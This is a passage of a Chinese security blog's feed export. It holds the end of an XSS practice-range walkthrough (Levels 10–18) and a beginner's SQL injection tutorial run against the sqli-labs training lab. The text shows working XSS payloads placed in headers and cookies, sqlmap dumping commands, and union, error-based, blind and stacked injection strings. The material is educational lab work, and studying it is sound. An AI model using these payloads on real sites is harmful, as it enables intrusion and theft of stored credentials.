title="Level10"></a>Level10</h2><ul><li><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code>        过滤了<code>&lt;&gt;</code>，尝试编码不能绕过，无法构造事件触发xss、无法利用属性的javascript协议、无法利用css注入<br><img src="https://i.loli.net/2021/02/13/rkp8zyZWtIailOT.png"></p></li><li><p>存在三个input变量，尝试提交<br>源码：<code>&lt;input name=&quot;t_sort&quot;  value=&quot; &#39;.$str33.&#39; &quot; type=&quot;hidden&quot;&gt;</code><br>Payload：<code>1&amp;t_sort=  &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://i.loli.net/2021/02/13/oKn6UHsgJPMIrqj.png"><br><code>1&amp;t_sort=xxx</code> 将xxx作为t_sort的value输入<br><code>&quot; type=&quot;text&quot; onclick=&quot;alert(1) </code>是置入value    的语句<br><code>type=&quot;text&quot;</code> 形成可点击的文本框，方便触发其后的onclick=”alert(1)</p></li></ul><h2 id="Level11"><a href="#Level11" class="headerlink" title="Level11"></a>Level11</h2><ul><li><p>查看源码<br>仅t_sort和t_ref的可传参，<br><code>$str11=$_SERVER[&#39;HTTP_REFERER&#39;];//</code>将payload从http头的referer栏获取<br><img src="https://i.loli.net/2021/02/13/2CutM5RFrlQoBhX.png"></p></li><li><p>一．<br>浏览器插件修改referfer，<code>value=1&amp;t_sort=  &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://i.loli.net/2021/02/13/JVetGAoDWhNuriS.png"></p></li><li><p>二．<br>利用burpsuite在跳转至该网页时抓包，修改其中<code>referer</code>为<code>poc</code>即可<br><code>1&amp;t_sort=  &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://i.loli.net/2021/02/13/brkZhBiJusDGMmT.png"></p></li></ul><h2 id="Level12"><a href="#Level12" class="headerlink" title="Level12"></a>Level12</h2><ul><li>输入：<code>&quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://i.loli.net/2021/02/13/FOBly6kYp5hQAxZ.png"><br><img src="https://i.loli.net/2021/02/13/8EiaVFOuep1N5nZ.png"></li></ul><ul><li>从标头中的User-Agent中获取<br>User-Agent：<code>&quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://i.loli.net/2021/02/13/W5JizDwSFlqy62Y.png"></li></ul><h2 id="Level13"><a href="#Level13" class="headerlink" title="Level13"></a>Level13</h2><p>如图<br><img src="https://i.loli.net/2021/02/13/EZn9j6qgMdRUGXS.png"></p><ul><li>查看标头<br><img src="https://i.loli.net/2021/02/13/WDyMe6XP7w9vTs8.png"></li></ul><ul><li>修改cookie<br>Cookie：<code>user=&quot;type=&quot;text&quot; onclick=&quot;alert(1)&quot;</code></li></ul><p><img src="https://i.loli.net/2021/02/13/dsWx4JaFARcfgEp.png"></p><h2 id="Level14"><a href="#Level14" class="headerlink" title="Level14"></a>Level14</h2><p>百度一下：本关因iframe调用的文件地址失效，无法进行测试。要考的应该是通过修改    iframe调用的文件来实现xss注入</p><h2 id="Level15"><a href="#Level15" class="headerlink" title="Level15"></a>Level15</h2><ul><li><p>ng-include指令一般用于包含外部的 HTML 文件，ng-include属性的值可以是一个表达    式，返回一个文件名，但是默认情况下，包含的文件需要包含在同一个域名下。<br><img src="https://i.loli.net/2021/02/13/fTDSb42LBXuZdjy.png"></p></li><li><p>可以包含一个有漏洞的页面进行破解<br>eg:    <code>level15.php?src=&#39;name=&lt;script&gt;alert(1)&lt;/script&gt;&#39;</code></p></li></ul><h2 id="Level16"><a href="#Level16" class="headerlink" title="Level16"></a>Level16</h2><ul><li><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://i.loli.net/2021/02/13/NBiRrWhDmXpkYeZ.png"></p></li><li><p>空格、反斜杠、script都被str_replace函数替换成&amp;nbsp<br><img src="https://i.loli.net/2021/02/13/vw2HtkGNqFW1ylD.png"></p></li><li><p>HTML中可以将%0a或者%0D当成空格使用，故可构造<br>Poc：<code>&lt;svg%0aonload=alert(1)&gt;</code><br><img src="https://i.loli.net/2021/02/13/WOAj6vXTerNdChY.png"></p></li></ul><h2 id="Level17"><a href="#Level17" class="headerlink" title="Level17"></a>Level17</h2><ul><li><p>Url中：level17.php?arg01=123&amp;arg02=321<br>将arg01和arg02的结果用=拼接<br><img src="https://i.loli.net/2021/02/13/H7Wjb1OS5twXYq2.png"></p></li><li><p>可利用此构造：<code>onclick=javascript:alert(/xss/)</code><br>Poc：<code>level17.php?arg01= onmousemove&amp;arg02=javascript:alert(/xss/)</code><br><img src="https://i.loli.net/2021/02/13/CmdPrh5uHVcEkyG.png"></p></li></ul><h2 id="Level18"><a href="#Level18" class="headerlink" title="Level18"></a>Level18</h2><p>同17<br><img src="https://i.loli.net/2021/02/13/DUo8dhKymzrpJEQ.png"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> web </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入的一些基操</title>
      <link href="2020/12/30/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%93%8D/"/>
      <url>2020/12/30/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%93%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次写博客0.0，梳理也记录一下自己学习的知识点，也方便日后复习叭。<br>如有错漏还请不吝指正ya<br>一些前置知识：<a href="https://www.cnblogs.com/backlion/p/7344548.html">Sqli-labs之sql注入基础知识</a></p><h1 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h1><ul><li>sql 注入：即通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</li></ul><ul><li><p>sql注入漏洞的产生条件：</p><ol><li>参数用户可控：前端传给后端的参数内容时用户可以控制的</li><li>参数会被带入数据库查询：传入的参数会拼接到sql语句，并且带入数据库查询。</li></ol></li><li><p>一满足以上两条件的PHP语句：</p><blockquote><p>$query = “SELECT * FROM users WHERE id = $_GET[ ‘id’ ] “;</p></blockquote></li></ul><p>(个人理解sql注入就是将要注入的sql命令置于表单查询的变量中，找到该变量的闭合方式将其闭合起来，从而使得注入的sql命令独立于查询变量之外，达到让注入的sql命令生效的目的。)</p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><ul><li><strong>手动注入</strong>：hackbar、burpsuite等等</li><li><strong>sqlmap</strong>（像盲注这种比较累的还是sqlmap方便，对盲注理解原理和方法后有工具提升效率还是不错滴）</li></ul><blockquote><p>sqlmap -h     #查看相关参数<br>sqlmap -u 目标网址         ——判断网站数据库类型<br>sqlmap -u 目标网址 –dbs    ——查看存在的数据库<br>sqlmap -u 目标网址 –tables -D 数据库名    ——查看指定数据库中存在的表<br>sqlmap -u 目标网址 –columns -T 表名 -D 数据库名    ——获取表中的字段<br>sqlmap -u 目标网址 –dump -C 字段名称 -T 表名 -D 数据库名    ——查看表里存储的内容<br>–fresh-queries      ——清楚缓存，直接加在命令末尾即可（在sqlmap扫一遍之后为了快捷会将数据缓存起来，有时候网站更新了数据但使用sqlmap得到的仍是未更新的数据，这时候就可以用这个命令清除缓存)</p></blockquote><blockquote><p>可利用sqkmap中的–technique选项指定注入方式。如下：<br>B : 基于Boolean的盲注（Boolean based blind）<br>Q : 内联查询（Inline queries）<br>T : 基于时间的盲注（time based blind）<br>U : 基于联合查询（Union query based）<br>E : 基于错误（error based）<br>S : 栈查询（stack queries）</p></blockquote><blockquote><p>以下摘自：<a href="https://www.cnblogs.com/insane-Mr-Li/p/10150165.html">Sqlmap命令详解</a><br>cookie注入：sqlmap.py -u 注入点 –cookie “参数” –tables –level 2<br>POST登录框注入：sqlmap.py -r 从文件读取数据 -p 指定的参数 –tables<br>sqlmap.py -u 登录的地址 –forms 自动判断注入<br>sqlmap.py -u 登录的地址 –data “指定参数”</p></blockquote><h1 id="页面请求方式与注释"><a href="#页面请求方式与注释" class="headerlink" title="页面请求方式与注释"></a>页面请求方式与注释</h1><h2 id="请求方式：GET和POST"><a href="#请求方式：GET和POST" class="headerlink" title="请求方式：GET和POST"></a>请求方式：GET和POST</h2><ul><li><h3 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h3></li></ul><p>url传达参数<br>提交的信息会显示在url中<br>可以在url中进行sql注入</p><ul><li><h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3></li></ul><p>提交的信息不会回显在url中，安全性相对更高，可以抓包或者利用插件修改post提交的信息<br>表单提交<br>通常有框框，常见比如登陆页面的账号框密码框啥的.<br>可以在框框里注入<br>也可以使用hackbar中的enable post或者burpsuite抓包。</p><ol><li><h4 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a>hackbar</h4></li></ol><p>用的是google chrome 的这款hackbar，UI界面挺简洁的（免费）<img src="https://i.loli.net/2021/02/13/n4gqkmaNVLlxdjy.png"></p><p><img src="https://i.loli.net/2021/02/13/vexmbfJIXCR67g1.png"><br>不过使用时要注意<br>在注sqli-labs靶场的时候不删除选中的这一段会报错（还不明白为什么），就需要将图中蓝色这一段(submit=Subimt)删去再execute。<br>burpsubite中保持原样即可</p><ol start="2"><li><h4 id="burp-suite"><a href="#burp-suite" class="headerlink" title="burp suite"></a>burp suite</h4></li></ol><p>先抓包，丢去repeater，注入<br><img src="https://i.loli.net/2021/02/13/87JTt2GvwUOoaLH.png"></p><h2 id="注释方式：-或–"><a href="#注释方式：-或–" class="headerlink" title="注释方式：#或–+"></a>注释方式：#或–+</h2><ul><li><p>sql中的注释符为 <code>-- (空格)</code> 和 <code>#</code> 以及 <code>/* */</code><br>(多行注释 <code>/**/</code>为成对匹配，将 <code>/*</code> 和 <code>*/</code> 中的内容注释掉，可在注入时用于绕过过滤规则)<br> <code>-- (空格)</code> ： sql中规定：–其后必须跟空格<br> (如果不加空格，– 会和系统自动生成的单引号连接在一起，被判定为关键词，无法注释掉系统自动生成的单引号)</p></li><li><p>使用<code>--+</code>的原因：<br>在url中输入空格按回车，传输过程中<strong>末端</strong>的空格会被忽略，<strong>其余</strong>空格会被转义为%20。<br> 而 + 会被解释为空格，因此在GET请求注入时使用<code>--+</code>或者<code>--%20</code>代替<code>--(空格)</code></p></li></ul><ul><li>GET请求时<code>#</code>无法正常使用，用 <code>--+</code>或者<code>%23</code>(#的url编码)<br>原因：url中无法显示某些特殊符号。在url中#表示书签，对服务端无用，导致HTTP请求中不包含# 。<br>(在url中输入#按回车就能发现#没有转换为urlencode编码格式)</li><li>url编码：% + 对应ASCII码</li></ul><h2 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h2><p>形如： <code>/*！code   */</code><br>内联注释可用于整个sql语句中，执行sql注入<br>内联注释会将 <code>/*！code   */</code>中的code注释掉，但仍执行code代表的命令</p><blockquote><p>index.php?id=1 /<em>! UNION</em>/ /<em>! SELECT</em>/ 1,2,3</p></blockquote><p><em>内联注释可以用来进行绕过注入</em></p><h1 id="注入思路"><a href="#注入思路" class="headerlink" title="注入思路"></a>注入思路</h1><blockquote><p>1.注入点<br>2.判断字段数<br>3.爆回显位<br>4.爆段<br>5.爆库<br>6.爆表<br>7.爆列<br>8.爆值</p></blockquote><p>偶尔爆出的信息是经过加密的，可以到解密网站解密：<br>如：<br><a href="https://www.cmd5.org">md5 decrypt</a><br><a href="https://pmd5.com/">pmd5</a><br><a href="http://tools.bugscaner.com/encodeanddecode/">各种加解密</a></p><h2 id="判断注入点及其闭合方式"><a href="#判断注入点及其闭合方式" class="headerlink" title="判断注入点及其闭合方式"></a>判断注入点及其闭合方式</h2><p>找传参点，再判断是否有sql注入漏洞</p><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><p>注入点大致可分为数字型和字符型<br>后端查找代码:</p><ul><li>数字型： <code>SELECT 列 FROM 表 WHERE  id=1</code> （数字型列=值）</li><li>字符型： <code>SELECT 列 FROM 表 WHERE  id=&#39;1&#39;</code>（字符型列=’值’）</li><li>还有一种搜索型注入我理解不深，可以看一下这篇：<a href="https://blog.csdn.net/weixin_42277564/article/details/94401484">SQL注入-搜索型输入</a></li></ul><h3 id="闭合方式"><a href="#闭合方式" class="headerlink" title="闭合方式"></a>闭合方式</h3><ul><li>数字型不存在闭合方式，后端代码不对其参数处理，而是直接赋值给变量。</li></ul><blockquote><p>eg: —(sqli-labs)–Less2<br>?id=1    正常回显<br>?id=-1    变化(构造不可能的值如 -1、999999999)<br>?id=1 and 1=1    正常回显<br>?id=1 and 1=2    变化（此时基本课判断存在数字型注入点）<br>?id=1 or 1=1 正常回显</p></blockquote><ul><li>字符型的闭合方式很多<br>例如 <code>‘ ’</code>、 <code>“ ”</code>、<code>( )</code>，还有它们的变种组合 <code>(&#39; &#39;)</code>、 <code>(&quot; &quot;)</code> 等等</li></ul><blockquote><p>eg:                              —(sqli-labs)–Less1<br>?id=1,正常回显<br>?id=1 and 1=1 正常回显<br>?id=1 and 1=2 正常回显<br>——————-判断为非数字型注入<br>?id=1’        变化/报错<br>?id=1’ –+        正常回显<br>——————-判断为字符型注入。闭合方式为单引号’ ’<br>—————————对不同闭合类型将 ‘ 改为对应闭合符号即可</p></blockquote><h2 id="判断字段数及回显位"><a href="#判断字段数及回显位" class="headerlink" title="判断字段数及回显位"></a>判断字段数及回显位</h2><h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><blockquote><p>eg:<br>?id=1’ order by 1 –+<br>?id=1’ order by 2 –+<br>?id=1’ order by 3 –+<br><img src="https://i.loli.net/2021/02/13/PYcbg56GCvoNQ2H.png"><br>?id=1’ order by 4 –+<br><img src="https://i.loli.net/2021/02/13/sV8G3k9mhRiIEaX.png"></p></blockquote><p>说明字段数为3，</p><h3 id="判断回显位"><a href="#判断回显位" class="headerlink" title="判断回显位"></a>判断回显位</h3><blockquote><p>eg:<br>?id=-1’ union select 1,2,3 –+<br><img src="https://i.loli.net/2021/02/13/V9R1TWPtJSKjeNx.png"></p></blockquote><p>2,3为回显位，因此在2、3的位置插入语句即可。</p><blockquote><p>eg:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+</span><br></pre></td></tr></table></figure></blockquote><h2 id="一库三表四字段"><a href="#一库三表四字段" class="headerlink" title="一库三表四字段"></a>一库三表四字段</h2><p>很多教程讲的很详细，这里不做赘述，挂个当时记的结构图<br><img src="https://i.loli.net/2021/02/13/VMmBU5JvkuAH9Oe.jpg"><br>select schema_name from information_schema.schemata<br>select table_name from information_schema.tables where table_schema=’xxx’<br>select column_name from information_schema.columns where table_name=’xxx’<br>select group_concat(xxx) from xxx</p><h1 id="各种注入"><a href="#各种注入" class="headerlink" title="各种注入"></a>各种注入</h1><h2 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h2><ul><li><p>适用：<code>页面有回显位的情况</code></p></li><li><p>当访问id=1 union selecet 1,2,3时，执行的sql语句为： <code>sql select * from users where &#39;id&#39;=1 union select 1,2,3 </code></p><p>此时的sql语句可分为两条：</p><ol><li><p><code>select * from users where &#39;id&#39;=1</code></p></li><li><p><code>union select 1,2,3</code> </p><p> 此时利用第二条语句(Union查询)即可获取数据库中的数据</p></li></ol></li></ul><p>eg:sqli-labs——Less1  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="comment">--判断注入点类型 </span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>#正常回显 </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #正常回显 </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> #正常回显</span><br><span class="line"><span class="comment">-------------------非数字型注入 </span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>’,报错 ?id<span class="operator">=</span><span class="number">1</span>’ <span class="comment">--+#正常回显</span></span><br><span class="line"><span class="comment">-------------------字符型注入。闭合方式为单引号’ ’</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span><span class="comment">--爆段  </span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1=1 order by 1 --+ #正常 </span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span> <span class="comment">--+ #正常 </span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1=1 order by 3 --+ #空白 </span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span> <span class="comment">--+ #报错(Unknow column ‘4’ in ‘order clause’)</span></span><br><span class="line"></span><br><span class="line">或 </span><br><span class="line"></span><br><span class="line">从 ?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1--+#报错 </span></span><br><span class="line"><span class="string">到 ?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+  #正常回显即可</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span><span class="comment">--爆数据库 </span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,database()--+ 得到数据库名security</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span><span class="comment">--爆表 </span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ </span></span><br><span class="line"><span class="string">#得到表名：emails,referers,uagents,users</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span><span class="comment">--爆列名 </span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; --+ </span></span><br><span class="line"><span class="string">得到列名 avatar,failed_login,....,USER,id,password,username</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span><span class="operator">-</span>爆值 ?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(username,0x2b,password) from users --+ </span></span><br><span class="line"><span class="string">得到：（+分隔账号密码） Dumb+Dumb,I-kill-you+Angelina,.....</span></span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><ul><li><p>适用：<code>页面中会显示SQL的报错信息 </code><br>但一般情况下SQL的报错信息是不会显示在页面中的，必须在在php.ini 进行配置<code>display_errors=On</code>   <em>–(开启PHP错误回显)</em>  </p></li><li><p>SQL报错信息被显示在页面上<br>(即通过 <code>echo mysqli_error($con)</code> 将错误信息输出到页面)</p></li></ul><h3 id="floor函数"><a href="#floor函数" class="headerlink" title="floor函数"></a>floor函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and (select count(*) from information_schema.tables group by concat((查询语句),floor(rand(0)*2))) --+</span></span><br></pre></td></tr></table></figure><h3 id="updataxml函数"><a href="#updataxml函数" class="headerlink" title="updataxml函数"></a>updataxml函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and (select updatexml(1,concat(0x7e,(查询语句),0x7e),1))--+</span></span><br></pre></td></tr></table></figure><h3 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and (select extractvalue(1,concat(0x7e,(查询语句),0x7e)))--+</span></span><br></pre></td></tr></table></figure><h2 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h2><ul><li>适用条件：<br><code>无查询结果、报错信息的回显，但页面会根据查询结果的正确与否变化的情况</code></li><li>真实渗透中手动盲注与sqlmap比起来效率太低，实战中还是使用sqlmap，但一定要熟知原理</li></ul><p>-常用函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">截取</span><br><span class="line">substr()、<span class="built_in">substring</span>()、id():</span><br><span class="line"><span class="built_in">substring</span>()和mid()的用法和substr()一样，但是mid()是为了向下兼容VB6<span class="number">.0</span>，已经过时，以上的几个函数的pos都是从<span class="number">1</span>开始的</span><br><span class="line">eg:</span><br><span class="line">substr(string, pos, len): 从pos开始，取长度为len的子串</span><br><span class="line">substr(string, pos): 从pos开始，取到string的最后</span><br><span class="line"></span><br><span class="line"><span class="keyword">left</span>()和<span class="keyword">right</span>():</span><br><span class="line"><span class="keyword">left</span>(string, len)和<span class="keyword">right</span>(string, len): 分别是从左或从右取string中长度为len的子串</span><br><span class="line">limit</span><br><span class="line">limit pos len: 在返回项中从pos开始去len个返回值，pos的从<span class="number">0</span>开始</span><br><span class="line"></span><br><span class="line">ascii()和<span class="type">char</span>()和ord():</span><br><span class="line">ascii(<span class="type">char</span>): 把<span class="type">char</span>这个字符转为ascii码</span><br><span class="line"><span class="type">char</span>(ascii_int): 和ascii()的作用相反，将ascii码转字符</span><br><span class="line">ord(str): 如果字符串str句首是单字节返回与ascii()函数返回的相同值。</span><br></pre></td></tr></table></figure><p> eg:sqli-labs Less5</p><ul><li>（正确则回显，不正确则无回显）</li><li>（可使用如left((select database()),1)&lt;’t’  这样的比较二分查找方法快速爆破）</li></ul><p>–爆库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select database()),1)=&#x27;</span>s<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> database()),<span class="number">8</span>)<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>–爆表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#x27;</span>users<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>–爆列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 4,1),8)=&#x27;</span>password<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 12,1),8)=&#x27;</span>username<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>–爆字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select password from users order by id limit 0,1))=8 --+(长度)</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>)<span class="operator">=</span><span class="string">&#x27;dumb&#x27;</span> <span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select username from users order by id limit 0,1),4)=&#x27;</span>dumb<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select password from users order by id limit 1,1))=10 --+(长度)</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">8</span>)<span class="operator">=</span><span class="string">&#x27;angelina  &#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><ul><li>适用：<br><code>无查询结果、报错信息的回显，页面正常显示的情况</code></li><li>时间盲注即利用<code>sleep()</code>或<code>benchmark()</code>等函数使得命令执行时间变长，常与<code>if(expr1,expr2,expr3)</code>搭配使用猜解数据库</li><li><code>if(expr1,expr2,expr3)</code>含义：<code>exp1</code>为<strong>TRUE</strong> 则 if()返回值为<code>expr2</code>,否则返回值为<code>expr3</code>. ——即 (1真返回2，1假返回3).</li><li>eg判断数据库库名长度语句为：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (length ( database() ) <span class="operator">&gt;</span><span class="number">1</span> , sleep(<span class="number">5</span>) , <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><ul><li>堆叠注入的使用条件十分有限，可能受到API、数据库引擎或者权限的限制。</li><li>在堆叠注入页面中，程序会获取GET参数ID，并利用PDO的方式查询数据，ID会被拼接到查询语句当中，导致PDO没起到预编译的效果—-导致程序存在sql注入漏洞</li><li><em>只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行</em></li><li>堆叠查询可以执行多条语句，多语句之间以分号隔开。堆叠注入就是利用此特点，在第二条sql语句中构造要注入的语句。</li><li>eg：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;select if(substr(user(),1,1)=&#x27;</span>r<span class="string">&#x27;,sleep(3),1) --+</span></span><br></pre></td></tr></table></figure><ul><li>这里的第二条语句(select if(substr(user(),1,1)=’r’,sleep(3),1) –+)即为时间盲注的语句</li><li>使用PDO执行SQL语句时，可以执行多条语句，不过这样通常不能直接得到注入结果，因为PDO只会返回第一条SQL语句执行的结果，所以在第二条语句中可以用update更新数据或者使用时间盲注获取数据</li></ul><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><ul><li><p>适用<code> 注入漏洞页面与查询页面不在同一页面</code></p></li><li><p>比方说1.php可以插入sql语句，2.php可以通过参数ID读取用户名和用户信息。</p></li><li><p>思路大体就是在多个页面中找到那个过滤措施不严密的网站作为突破口，从而达成自己的注入目的。</p></li></ul><h2 id="宽字节注入（GBK双字节绕过）"><a href="#宽字节注入（GBK双字节绕过）" class="headerlink" 